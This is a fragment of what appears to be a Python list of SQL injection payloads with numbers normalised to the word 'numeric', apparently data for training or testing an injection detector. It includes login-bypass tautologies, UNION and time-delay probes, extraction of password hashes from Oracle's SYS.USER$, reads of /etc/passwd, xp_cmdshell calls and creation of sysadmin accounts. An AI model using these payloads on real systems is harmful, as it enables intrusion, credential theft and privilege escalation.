       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( GRANTED_ROLE  )  )   FROM DBA_ROLE_PRIVS WHERE GRANTEE = SYS.LOGIN_USER  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = numeric )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = numeric )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = numeric )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = numeric )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = numeric )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"' AND numeric= utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = numeric  )  )   AND 'i' = 'i\",\n",
       " \"'|| ( elt ( -3+5,bin (numeric ) ,ord (numeric0 ) ,hex ( char ( numeric  )  )    )  )  \",\n",
       " '||6',\n",
       " \"'||'6\",\n",
       " ' ( ||6 ) ',\n",
       " \"' or numeric=numeric-- \",\n",
       " 'or numeric=numeric',\n",
       " \"' or 'numeric' = 'numeric\",\n",
       " \"; or 'numeric' = 'numeric'\",\n",
       " '\" or isNULL (numeric/0 )  /*',\n",
       " \"' or 'numeric' = 'numeric\",\n",
       " '\" or isNULL (numeric/0 )  /*',\n",
       " \"' -- \",\n",
       " \"' or numeric=numeric--\",\n",
       " '\" or numeric=numeric--',\n",
       " \"' or numeric= numeric/*\",\n",
       " 'or numeric=numeric--',\n",
       " \"' or 'a' = 'a\",\n",
       " '\" or \"a\" = \"a',\n",
       " \"' )  or  ( 'a' = 'a\",\n",
       " \"admin' or '\",\n",
       " \"' select * from information_schema.tables--\",\n",
       " ' )  union select * from information_schema.tables;',\n",
       " \"' having numeric=numeric--\",\n",
       " \"' having numeric=numeric--\",\n",
       " \"' group by userid having numeric=numeric--\",\n",
       " \"' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename' ) --\",\n",
       " \"' or numericin  ( select @@version ) --\",\n",
       " \"' union all select @@version--\",\n",
       " \"' or 'unusual'  =  'unusual'\",\n",
       " \"' or 'something'  =  'some'+'thing'\",\n",
       " \"' or 'text'  =  n'text'\",\n",
       " \"' or 'something' like 'some%'\",\n",
       " \"' or numeric >numeric\",\n",
       " \"' or 'text' > 't'\",\n",
       " \"' or 'whatever' in  ( 'whatever' ) \",\n",
       " \"' or numeric between numericand 3\",\n",
       " \"' or username like char ( numeric ) ;\",\n",
       " \"' union select * from users where login  =  char (numeric14,11numeric,11numeric,116 ) ;\",\n",
       " \"' union select \",\n",
       " 'password:*/ =numeric--',\n",
       " 'uni/**/on sel/**/ect',\n",
       " \"'; execute immediate 'sel' || 'ect us' || 'er'\",\n",
       " \"'; exec  ( 'sel' + 'ect us' + 'er' ) \",\n",
       " \"'/**/or/**/1/**/ = /**/1\",\n",
       " \"' ornumeric/*\",\n",
       " ' or isNULL (numeric/0 )  /*',\n",
       " \"' or 'numeric' = 'numeric\",\n",
       " '\" or isNULL (numeric/0 )  /*',\n",
       " \"' -- &password = \",\n",
       " \"'; begin declare @var varchar ( 8000 )  set @var = ':' select @var = @var+'+login+'/'+password+' ' from users where login > \",\n",
       " '@var select @var as var into temp end --',\n",
       " \"' and numericin  ( select var from temp ) --\",\n",
       " \"' union select numeric,load_file ( '/etc/passwd' ) ,numeric,numeric,1;\",\n",
       " '1; ( load_file ( char ( 47,10numeric,116,99,47,112,97,115,115,119,100  )  )   ) ,numeric,numeric,1;',\n",
       " \"' and numeric=  (  if  (  (  load_file ( char (numeric10,46,10numeric,120,116  )  )  <>char ( 39,39  )  )  ,numeric,0  )  )  ;\",\n",
       " \"'; exec master..xp_cmdshell '10.10.1.2'--\",\n",
       " \"create user name identified by 'pass123'\",\n",
       " 'create user name identified by passnumericnumeric temporary tablespace temp default tablespace users; ',\n",
       " \"' ; drop table temp --\",\n",
       " \"exec sp_addlogin 'name' , 'password'\",\n",
       " \"exec sp_addsrvrolemember 'name' , 'sysadmin'\",\n",
       " \"insert into mysql.user  ( user, host, password )  values  ( 'name', 'localhost', password ( 'pass123'  )  )  \",\n",
       " 'grant connect to name; grant resource to name;',\n",
       " 'insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 ) ',\n",
       " \"' or numeric= numeric--\",\n",
       " \"' union  ( select @@version )  --\",\n",
       " \"' union  ( select NULL,  ( select @@version  )  )   --\",\n",
       " \"' union  ( select NULL, NULL,  ( select @@version  )  )   --\",\n",
       " \"' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --\",\n",
       " \"' union  ( select NULL, NULL, NULL, NULL,   ( select @@version  )  )   --\",\n",
       " \"' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --\",\n",
       " \"'; if not ( substring  (  (  select @@version ) ,25,numeric)  <> 0 )  waitfor delay '0:0:2' --\",\n",
       " \"'; if not ( substring  (  (  select @@version ) ,25,numeric)  <> numeric )  waitfor delay '0:0:2' --\",\n",
       " \"'; if not ( substring  (  (  select @@version ) ,25,numeric)  <> numeric )  waitfor delay '0:0:2' --\",\n",
       " \"'; if not ( substring  (  (  select @@version ) ,24,numeric)  <> numeric)  waitfor delay '0:0:2' --\",\n",
       " \"'; if not ( select system_user )  <> 'sa' waitfor delay '0:0:2' --\",\n",
       " \"'; if is_srvrolemember ( 'sysadmin' )  > 0 waitfor delay '0:0:2' -- \",\n",
       " \"'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> numeric)  waitfor delay '0:0:2' --\",\n",
       " \"'; if not  (  (  select serverproperty ( 'isintegratedsecurityonly'  )  )   <> 0 )  waitfor delay '0:0:2' --\",\n",
       " ' select * from users where id = numericor  ( \\\\ )  = numericunion select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor  ( \\\\. )  = numericunion select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor  ( \\\\+ )  = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor  ( numeric)  = numericunion select numeric,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id = numericor  ( \\\\+ )  = numericunion select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor  ( $+ )  = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor  ( $+ )  = numericunion select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor \\\\.<\\\\ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \\\\.<numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \\\\.<numericunion select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor \\\\.<\\\\ union select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor \\\\.<$ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \\\\.<$ union select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor \\\\.<  = numericunion select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric||numericunion select numeric,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id = numeric||numericunion select null,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id = numeric  or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \\\\+<\\\\ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor numeric<@ = numericunion select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericor \\\\+<\\\\ union select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor \\\\+<$ union select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericornumeric&@# = numericunion select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericor $ . = numericunion select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor $ numeric= numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor $ numeric= numericunion select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor $<\\\\ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor $<\\\\. or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor $<\\\\. union select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor $<\\\\ union select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor $+<\\\\ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor $+<numericunion select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor $+<\\\\ union select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor $+<$ union select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor \\\\<\\\\. or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \\\\<\\\\. union select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor \\\\<numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \\\\<numericunion select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor \\\\<\\\\ union select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor \\\\<\\\\ union select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor \\\\<$ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \\\\<$ union select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor \\\\<  = numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor \\\\<  = numericunion select numeric,@@VERSION --numeric',\n",
       " ' select * from users where id = numericor !<@ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numericor !<@ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericor @`\\\\` union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericor  @$# = numericunion select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericor @<@ = numericunion select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric+ ( \\\\ )  or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+ ( \\\\ )  union select null,@@VERSION --numeric',\n",
       " ' select * from users where id =numeric.&&numericunion select numeric,version (  )  --numeric',\n",
       " ' select * from users where id =numeric. or numeric= numeric--numeric',\n",
       " ' select * from users where id =numeric.&&@ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric+  ( \\\\. )  or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+  ( \\\\. )  union select null,@@VERSION --numeric',\n",
       " ' select * from users where id =numeric.  union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id =numeric. union select numeric,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id =numeric.  union select version (  ) ,version (  )  --numeric',\n",
       " ' select * from users where id =numeric. union select null,version (  )  --numeric',\n",
       " ' select * from users where id = numeric+\\\\. union select null,@@VERSION --numeric',\n",
       " ' select * from users where id =numeric. union select null,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id =numeric. <@ or numeric= numeric--numeric',\n",
       " ' select * from users where id =numeric.<@. or numeric= numeric--numeric',\n",
       " ' select * from users where id =numeric.<@. union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id =numeric.*numericor numeric= numeric--numeric',\n",
       " ' select * from users where id =numeric.*numericunion select numeric,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id =numeric.<1# union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id =numeric. <@ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id =numeric. <@ union select version (  ) ,version (  )  --numeric',\n",
       " ' select * from users where id =numeric.*\\\\ union select null,@@VERSION --numeric',\n",
       " ' select * from users where id =numeric.<@$ or numeric= numeric--numeric',\n",
       " ' select * from users where id =numeric.<@$ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id =numeric.%@ or numeric= numeric--numeric',\n",
       " ' select * from users where id =numeric.%@ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id =numeric1||numericunion select numeric,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id = numeric+numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+ ( numeric)  or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+ ( numeric)  union select numeric,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id = numeric+ ( numeric)  union select null,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id = numeric+numericunion select numeric,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id = numeric+numericunion select null,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id =numeric1<1# union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric+  ( \\\\+ )  or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+  ( \\\\+ )  union select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric+\\\\+. union select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric-1<@ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric+1<@ union select version (  ) ,version (  )  --numeric',\n",
       " ' select * from users where id = numeric+1<@ union select null,version (  )  --numeric',\n",
       " ' select * from users where id = numeric+ \\\\+%\\\\ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+ \\\\+%numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+ \\\\+%numericunion select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric+ \\\\+*\\\\ union select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric+ \\\\+%$ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+ \\\\+*$ union select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numericunion select  ( numeric) ,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id = numericunion selectnumeric||numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion selectnumeric||@,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select numeric1$,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select numeric$,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select numeric1a,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion selectnumeric<@$,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select numeric,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id = numericunion select .1_,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion selectnumeric`\\\\`,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion selectnumerica#,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id = numericunion selectnumerica,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id = numericunion select .1$_,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion selectnumeric<@,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion selectnumeric<@.,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select numeric$$,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select !<numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select +!<numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select +!<@,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select !<@,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select @||numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select @&&@,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select @numeric$,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select  @ $,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select @numerica,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select @<@$,version (  )  --numeric',\n",
       " ' select * from users where id = numeric  union select null,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id = numericunion select @ _,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select @ $_,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select @<@,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select @<@.,version (  )  --numeric',\n",
       " ' select * from users where id = numericunion select @ $$,version (  )  --numeric',\n",
       " ' select * from users where id = numeric+$ . or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+$ . union select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric+$ numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+$ numericunion select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric+$+ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+  ( $+ )  or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+  ( $+ )  union select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric+$+. or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+$+. union select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric+$+ union select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric+ $+%\\\\ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+ $+%numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+ $+%numericunion select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric+ $+*\\\\ union select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric+ $+%$ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric+ $+*$ union select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric<@ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric% ( \\\\ )  or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric* ( \\\\ )  union select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric% ( numeric)  or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric* ( numeric)  union select numeric,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id = numeric% ( $ )  or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric% ( @ )  or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric<@. or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric<@.. or numeric= numeric--numeric',\n",
       " ' select * from users where id =numeric<@.. union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric<@. union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric <@. union select version (  ) ,version (  )  --numeric',\n",
       " ' select * from users where id = numeric*\\\\. union select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric<@.$ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric<@.$ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric*numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric*numericunion select numeric,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id = numeric*numericunion select null,banner from v$version where rownum = numeric--numeric',\n",
       " ' select * from users where id = numeric<1## union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric<@1$ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric<@1$ union select numeric,version (  )  --numeric',\n",
       " ' select * from users where id = numeric*\\\\ union select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric<@$ or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric%$ . or numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric*$ . union select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric%$ numericor numeric= numeric--numeric',\n",
       " ' select * from users where id = numeric%$ numericunion select null,@@VERSION --numeric',\n",
       " ' select * from users where id = numeric<@$_ or numeric= numeric--numeric',\n",
